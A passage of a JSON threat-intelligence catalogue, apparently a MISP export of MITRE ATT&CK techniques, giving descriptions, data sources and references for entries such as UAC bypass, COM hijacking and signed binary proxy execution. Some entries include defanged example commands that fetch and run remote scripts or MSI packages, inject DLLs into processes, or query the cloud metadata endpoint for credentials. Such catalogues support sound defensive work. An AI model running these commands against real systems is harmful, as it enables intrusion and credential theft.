(Citation: SANS UAC Bypass)",
      "meta": {
        "external_id": "T1088",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "System calls",
          "Process monitoring",
          "Authentication logs",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1088",
          "https://technet.microsoft.com/en-us/itpro/windows/keep-secure/how-user-account-control-works",
          "https://technet.microsoft.com/en-US/magazine/2009.07.uac.aspx",
          "https://msdn.microsoft.com/en-us/library/ms679687.aspx",
          "http://www.pretentiousname.com/misc/win7_uac_whitelist2.html",
          "https://github.com/hfiref0x/UACME",
          "https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/",
          "https://blog.fortinet.com/2016/12/16/malicious-macro-bypasses-uac-to-elevate-privilege-for-fareit-malware",
          "http://pen-testing.sans.org/blog/pen-testing/2013/08/08/psexec-uac-bypass",
          "https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/",
          "https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/"
        ]
      },
      "uuid": "ca1a3f50-5ebd-41f8-8320-2c7d6a6e88be",
      "value": "Bypass User Account Control - T1088"
    },
    {
      "description": "Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\n\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1063). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.",
      "meta": {
        "external_id": "T1211",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Windows Error Reporting",
          "Process monitoring",
          "File monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "Windows",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1211"
        ]
      },
      "uuid": "fe926152-f431-4baf-956c-4ad3cb0bf23b",
      "value": "Exploitation for Defense Evasion - T1211"
    },
    {
      "description": "Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). (Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of extra window memory (EWM) to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.\n\nExecution granted through EWM injection may take place in the address space of a separate live process. Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread. (Citation: Endgame Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process. (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)",
      "meta": {
        "external_id": "T1181",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1181",
          "https://msdn.microsoft.com/library/windows/desktop/ms633574.aspx",
          "https://msdn.microsoft.com/library/windows/desktop/ms633584.aspx",
          "https://msdn.microsoft.com/library/windows/desktop/ms633591.aspx",
          "https://www.malwaretech.com/2013/08/powerloader-injection-something-truly.html",
          "https://www.welivesecurity.com/2013/03/19/gapz-and-redyms-droppers-based-on-power-loader-code/",
          "https://msdn.microsoft.com/library/windows/desktop/ms644953.aspx",
          "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process"
        ]
      },
      "uuid": "52f3d5a6-8a0f-4f82-977e-750abf90d0b0",
      "value": "Extra Window Memory Injection - T1181"
    },
    {
      "description": "Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain access to systems. One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions. (Citation: Technet MS14-068) (Citation: ADSecurity Detecting Forged Tickets) Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
      "meta": {
        "external_id": "T1212",
        "kill_chain": [
          "mitre-attack:credential-access"
        ],
        "mitre_data_sources": [
          "Authentication logs",
          "Windows Error Reporting",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "Windows",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1212",
          "https://technet.microsoft.com/en-us/library/security/ms14-068.aspx",
          "https://adsecurity.org/?p=1515"
        ]
      },
      "uuid": "9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
      "value": "Exploitation for Credential Access - T1212"
    },
    {
      "description": "The Component Object Model (COM) is a system within Windows to enable interaction between software components through the operating system. (Citation: Microsoft Component Object Model) Adversaries can use this system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Windows Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. (Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",
      "meta": {
        "external_id": "T1122",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "Windows Registry",
          "DLL monitoring",
          "Loaded DLLs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1122",
          "https://msdn.microsoft.com/library/ms694363.aspx",
          "https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence",
          "https://www.endgame.com/blog/how-hunt-detecting-persistence-evasion-com"
        ]
      },
      "uuid": "9b52fca7-1a36-4da0-b62d-da5bd83b4d69",
      "value": "Component Object Model Hijacking - T1122"
    },
    {
      "description": "Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.\n\nAdversaries may also collect information from shared storage repositories hosted on cloud infrastructure or in software-as-a-service (SaaS) applications, as storage is one of the more fundamental requirements for cloud services and systems.\n\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\n\n* Policies, procedures, and standards\n* Physical / logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing / development credentials\n* Work / project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n\nSpecific common information repositories include:\n\n### Microsoft SharePoint\nFound in many enterprise networks and often used to store and share significant amounts of documentation.\n\n### Atlassian Confluence\nOften found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation.",
      "meta": {
        "external_id": "T1213",
        "kill_chain": [
          "mitre-attack:collection"
        ],
        "mitre_data_sources": [
          "Azure activity logs",
          "AWS CloudTrail logs",
          "Stackdriver logs",
          "OAuth audit logs",
          "Application logs",
          "Authentication logs",
          "Data loss prevention",
          "Third-party application logs"
        ],
        "mitre_platforms": [
          "Linux",
          "Windows",
          "macOS",
          "SaaS",
          "AWS",
          "GCP",
          "Azure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1213",
          "https://support.office.com/en-us/article/configure-audit-settings-for-a-site-collection-a9920c97-38c0-44f2-8bcb-4cf1e2ae22d2",
          "https://confluence.atlassian.com/confkb/how-to-enable-user-access-logging-182943.html"
        ]
      },
      "uuid": "d28ef391-8ed4-45dc-bc4a-2f43abf54416",
      "value": "Data from Information Repositories - T1213"
    },
    {
      "description": "On Android, applications can use standard APIs to gather a list of network connections to and from the device. For example, the Network Connections app available in the Google Play Store (Citation: ConnMonitor) advertises this functionality.",
      "meta": {
        "external_id": "T1421",
        "kill_chain": [
          "mitre-mobile-attack:discovery"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1421",
          "https://play.google.com/store/apps/details?id=com.antispycell.connmonitor&hl=en"
        ]
      },
      "uuid": "dd818ea5-adf5-41c7-93b5-f3b839a219fb",
      "value": "System Network Connections Discovery - T1421"
    },
    {
      "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming) When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide) Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
      "meta": {
        "external_id": "T1215",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "System calls",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1215",
          "https://www.tldp.org/LDP/lkmpg/2.4/lkmpg.pdf",
          "http://www.tldp.org/LDP/lkmpg/2.4/html/x437.html",
          "https://volatility-labs.blogspot.com/2012/10/phalanx-2-revealed-using-volatility-to.html",
          "https://www.crowdstrike.com/blog/http-iframe-injecting-linux-rootkit/",
          "https://github.com/f0rb1dd3n/Reptile",
          "https://github.com/m0nad/Diamorphine",
          "http://www.megasecurity.org/papers/Rootkits.pdf",
          "https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf",
          "https://www.synack.com/2017/09/08/high-sierras-secure-kernel-extension-loading-is-broken/",
          "https://securelist.com/the-ventir-trojan-assemble-your-macos-spy/67267/",
          "https://en.wikipedia.org/wiki/Loadable_kernel_module#Linux",
          "http://tldp.org/HOWTO/Module-HOWTO/x197.html"
        ]
      },
      "uuid": "6be14413-578e-46c1-8304-310762b3ecd5",
      "value": "Kernel Modules and Extensions - T1215"
    },
    {
      "description": "Windows shared drive and [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the <code>net use \\\\system\\share /delete</code> command. (Citation: Technet Net Use)\n\nAdversaries may remove share connections that are no longer useful in order to clean up traces of their operation.",
      "meta": {
        "external_id": "T1126",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "Process command-line parameters",
          "Packet capture",
          "Authentication logs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1126",
          "https://technet.microsoft.com/bb490717.aspx"
        ]
      },
      "uuid": "e7eab98d-ae11-4491-bd28-a53ba875865a",
      "value": "Network Share Connection Removal - T1126"
    },
    {
      "description": "Scripts signed with trusted certificates can be used to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application whitelisting solutions that do not account for use of these scripts.\n\nPubPrn.vbs is signed by Microsoft and can be used to proxy execution from a remote site. (Citation: Enigma0x3 PubPrn Bypass) Example command: <code>cscript C[:]\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png</code>\n\nThere are several other signed scripts that may be used in a similar manner. (Citation: GitHub Ultimate AppLocker Bypass List)",
      "meta": {
        "external_id": "T1216",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1216",
          "https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/",
          "https://github.com/api0cradle/UltimateAppLockerByPassList"
        ]
      },
      "uuid": "f6fe9070-7a65-49ea-ae72-76292f42cebe",
      "value": "Signed Script Proxy Execution - T1216"
    },
    {
      "description": "Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.\n\n### Msiexec.exe\nMsiexec.exe is the command-line Windows utility for the Windows Installer. Adversaries may use msiexec.exe to launch malicious MSI files for code execution. An adversary may use it to launch local or network accessible MSI files.(Citation: LOLBAS Msiexec)(Citation: Rancor Unit42 June 2018)(Citation: TrendMicro Msiexec Feb 2018) Msiexec.exe may also be used to execute DLLs.(Citation: LOLBAS Msiexec)\n\n* <code>msiexec.exe /q /i \"C:\\path\\to\\file.msi\"</code>\n* <code>msiexec.exe /q /i http[:]//site[.]com/file.msi</code>\n* <code>msiexec.exe /y \"C:\\path\\to\\file.dll\"</code>\n\n### Mavinject.exe\nMavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process. (Citation: Twitter gN3mes1s Status Update MavInject32)\n\n* <code>\"C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\MavInject32.exe\" &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>\n* <code>C:\\Windows\\system32\\mavinject.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code>\n\n### SyncAppvPublishingServer.exe\nSyncAppvPublishingServer.exe can be used to run PowerShell scripts without executing powershell.exe. (Citation: Twitter monoxgas Status Update SyncAppvPublishingServer)\n\n### Odbcconf.exe\nOdbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The utility can be misused to execute functionality equivalent to [Regsvr32](https://attack.mitre.org/techniques/T1117) with the REGSVR option to execute a DLL.(Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017)\n\n* <code>odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;</code>\n\nSeveral other binaries exist that may be used to perform similar behavior. (Citation: GitHub Ultimate AppLocker Bypass List)",
      "meta": {
        "external_id": "T1218",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1218",
          "https://lolbas-project.github.io/lolbas/Binaries/Msiexec/",
          "https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/",
          "https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/",
          "https://twitter.com/gn3mes1s/status/941315826107510784",
          "https://twitter.com/monoxgas/status/895045566090010624",
          "https://docs.microsoft.com/en-us/sql/odbc/odbcconf-exe?view=sql-server-2017",
          "https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/",
          "https://blog.trendmicro.com/trendlabs-security-intelligence/backdoor-carrying-emails-set-sights-on-russian-speaking-businesses/",
          "https://blog.trendmicro.com/trendlabs-security-intelligence/cobalt-spam-runs-use-macros-cve-2017-8759-exploit/",
          "https://github.com/api0cradle/UltimateAppLockerByPassList"
        ]
      },
      "uuid": "457c7820-d331-465a-915e-42f85500ccc4",
      "value": "Signed Binary Proxy Execution - T1218"
    },
    {
      "description": "The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like CreateProcess(), LoadLibrary(), etc. of the Win32 API. (Citation: Wikipedia Windows Library Files)\n\nThe module loader can load DLLs:\n\n* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;\n    \n* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);\n    \n* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;\n    \n* via <code>&#x3c;file name=\"filename.extension\" loadFrom=\"fully-qualified or relative pathname\"&#x3e;</code> in an embedded or external \"application manifest\". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.\n\nAdversaries can use this functionality as a way to execute arbitrary code on a system.",
      "meta": {
        "external_id": "T1129",
        "kill_chain": [
          "mitre-attack:execution"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "DLL monitoring",
          "File monitoring",
          "Process monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1129",
          "https://en.wikipedia.org/wiki/Microsoft_Windows_library_files"
        ]
      },
      "uuid": "0a5231ec-41af-4a35-83d0-6bdf11f28c65",
      "value": "Execution through Module Load - T1129"
    },
    {
      "description": "For attacks incorporating social engineering the utilization of an on-line persona is important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites ([Facebook](https://www.facebook.com), [LinkedIn](https://www.linkedin.com), [Twitter](https://twitter.com), [Google+](https://plus.google.com), etc.). (Citation: NEWSCASTER2014) (Citation: BlackHatRobinSage) (Citation: RobinSageInterview)",
      "meta": {
        "external_id": "T1341",
        "kill_chain": [
          "mitre-pre-attack:persona-development"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1341"
        ]
      },
      "uuid": "9108e212-1c94-4f8d-be76-1aad9b4c86a4",
      "value": "Build social network persona - T1341"
    },
    {
      "description": "A remote access tool (RAT) is a piece of software that allows a remote user to control a system as if they had physical access to that system. An adversary may utilize existing RATs, modify existing RATs, or create their own RAT. (Citation: ActiveMalwareEnergy)",
      "meta": {
        "external_id": "T1351",
        "kill_chain": [
          "mitre-pre-attack:build-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1351"
        ]
      },
      "uuid": "9755ecdc-deb0-40e6-af49-713cb0f8ed92",
      "value": "Remote access tool development - T1351"
    },
    {
      "description": "An adversary may secure and protect their infrastructure just as defenders do. This could include the use of VPNs, security software, logging and monitoring, passwords, or other defensive measures. (Citation: KrebsTerracottaVPN)",
      "meta": {
        "external_id": "T1317",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1317"
        ]
      },
      "uuid": "cc0faf66-4df2-4328-9c9c-b0ca5de915ad",
      "value": "Secure and protect infrastructure - T1317"
    },
    {
      "description": "Obfuscation is the act of creating code that is more difficult to understand. Encoding transforms the code using a publicly available format. Encryption transforms the code such that it requires a key to reverse the encryption. (Citation: CylanceOpCleaver)",
      "meta": {
        "external_id": "T1319",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1319"
        ]
      },
      "uuid": "357e137c-7589-4af1-895c-3fbad35ea4d2",
      "value": "Obfuscate or encrypt code - T1319"
    },
    {
      "description": "Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating.  This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.\n\nAdversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)",
      "meta": {
        "external_id": "T1514",
        "kill_chain": [
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "API monitoring"
        ],
        "mitre_platforms": [
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1514",
          "https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg",
          "https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken?slide=8",
          "https://www.carbonblack.com/2019/02/12/tau-threat-intelligence-notification-new-macos-malware-variant-of-shlayer-osx-discovered/",
          "https://objective-see.com/blog/blog_0x2A.html"
        ]
      },
      "uuid": "101c3a64-9ba5-46c9-b573-5c501053cbca",
      "value": "Elevated Execution with Prompt - T1514"
    },
    {
      "description": "An adversary may encrypt files stored on the mobile device to prevent the user from accessing them, for example with the intent of only unlocking access to the files after a ransom is paid. Without escalated privileges, the adversary is generally limited to only encrypting files in external/shared storage locations. This technique has been demonstrated on Android. We are unaware of any demonstrated use on iOS.",
      "meta": {
        "external_id": "APP-28",
        "kill_chain": [
          "mitre-mobile-attack:impact"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1471",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-28.html"
        ]
      },
      "uuid": "d9e88203-2b5d-405f-a406-2933b1e3d7e4",
      "value": "Data Encrypted for Impact - T1471"
    },
    {
      "description": "Adversaries can take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify behavior, and intercept information as part of various man in the browser techniques. (Citation: Wikipedia Man in the Browser)\n\nA specific example is when an adversary injects software into a browser that allows an them to inherit cookies, HTTP sessions, and SSL client certificates of a user and use the browser as a way to pivot into an authenticated intranet. (Citation: Cobalt Strike Browser Pivot) (Citation: ICEBRG Chrome Extensions)\n\nBrowser pivoting requires the SeDebugPrivilege and a high-integrity process to execute. Browser traffic is pivoted from the adversary's browser through the user's browser by setting up an HTTP proxy which will redirect any HTTP and HTTPS traffic. This does not alter the user's traffic in any way. The proxy connection is severed as soon as the browser is closed. Whichever browser process the proxy is injected into, the adversary assumes the security context of that process. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could browse to any resource on an intranet that is accessible through the browser and which the browser has sufficient permissions, such as Sharepoint or webmail. Browser pivoting also eliminates the security provided by 2-factor authentication. (Citation: cobaltstrike manual)",
      "meta": {
        "external_id": "T1185",
        "kill_chain": [
          "mitre-attack:collection"
        ],
        "mitre_data_sources": [
          "Authentication logs",
          "Packet capture",
          "Process monitoring",
          "API monitoring"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1185",
          "https://en.wikipedia.org/wiki/Man-in-the-browser",
          "https://www.cobaltstrike.com/help-browser-pivoting",
          "https://www.icebrg.io/blog/malicious-chrome-extensions-enable-criminals-to-impact-over-half-a-million-users-and-global-businesses",
          "https://cobaltstrike.com/downloads/csmanual38.pdf"
        ]
      },
      "uuid": "544b0346-29ad-41e1-a808-501bb4193f47",
      "value": "Man in the Browser - T1185"
    },
    {
      "description": "To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system for persistence and evading a typical user or system analysis that does not incorporate investigation of hidden files.\n\n### Windows\n\nUsers can mark specific files as hidden by using the attrib.exe binary. Simply do <code>attrib +h filename</code> to mark a file or folder as hidden. Similarly, the “+s” marks a file as a system file and the “+r” flag marks the file as read only. Like most windows binaries, the attrib.exe binary provides the ability to apply these changes recursively “/S”.\n\n### Linux/Mac\n\nUsers can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folder that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable. For command line usages, there is typically a flag to see all files (including hidden ones). To view these files in the Finder Application, the following command must be executed: <code>defaults write com.apple.finder AppleShowAllFiles YES</code>, and then relaunch the Finder Application.\n\n### Mac\n\nFiles on macOS can be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker).\nMany applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.",
      "meta": {
        "external_id": "T1158",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:persistence"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "Process monitoring",
          "Process command-line parameters"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1158",
          "https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/",
          "https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/",
          "https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/reports/Unit_42/unit42-wirelurker.pdf"
        ]
      },
      "uuid": "dc27c2ec-c5f9-4228-ba57-d67b590bda93",
      "value": "Hidden Files and Directories - T1158"
    },
    {
      "description": "On Android, details of onboard network interfaces are accessible to apps through the java.net.NetworkInterface class (Citation: NetworkInterface). The Android TelephonyManager class can be used to gather related information such as the IMSI, IMEI, and phone number (Citation: TelephonyManager).",
      "meta": {
        "external_id": "T1422",
        "kill_chain": [
          "mitre-mobile-attack:discovery"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1422",
          "https://developer.android.com/reference/java/net/NetworkInterface.html",
          "https://developer.android.com/reference/android/telephony/TelephonyManager.html"
        ]
      },
      "uuid": "d4536441-1bcc-49fa-80ae-a596ed3f7ffd",
      "value": "System Network Configuration Discovery - T1422"
    },
    {
      "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, attackers may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows the attacker to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
      "meta": {
        "external_id": "T1522",
        "kill_chain": [
          "mitre-attack:credential-access"
        ],
        "mitre_data_sources": [
          "Azure activity logs",
          "AWS CloudTrail logs",
          "Authentication logs"
        ],
        "mitre_platforms": [
          "AWS",
          "GCP",
          "Azure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1522",
          "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html",
          "https://redlock.io/blog/instance-metadata-api-a-modern-day-trojan-horse"
        ]
      },
      "uuid": "1c2fd73a-e634-44ed-b1b5-9e7cf7404e9f",
      "value": "Cloud Instance Metadata API - T1522"
    },
    {
      "description": "Analysts identify gap areas that generate a compelling need to generate a Key Intelligence Topic (KIT) or Key Intelligence Question (KIQ). (Citation: BrighthubGapAnalysis) (Citation: ICD115) (Citation: JP2-01)",
      "meta": {
        "external_id": "T1233",
        "kill_chain": [
          "mitre-pre-attack:priority-definition-planning"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1233"
        ]
      },
      "uuid": "0fad2267-9f46-4ebb-91b5-d543243732cb",
      "value": "Identify analyst level gaps - T1233"
    },
    {
      "description": "Analysts may receive Key Intelligence Topics (KITs) and Key Intelligence Questions (KIQs) from leadership or key decision makers and generate intelligence requirements to articulate intricacies of information required on a topic or question. (Citation: Herring1999)",
      "meta": {
        "external_id": "T1234",
        "kill_chain": [
          "mitre-pre-attack:priority-definition-planning"
        ],
        "refs": [
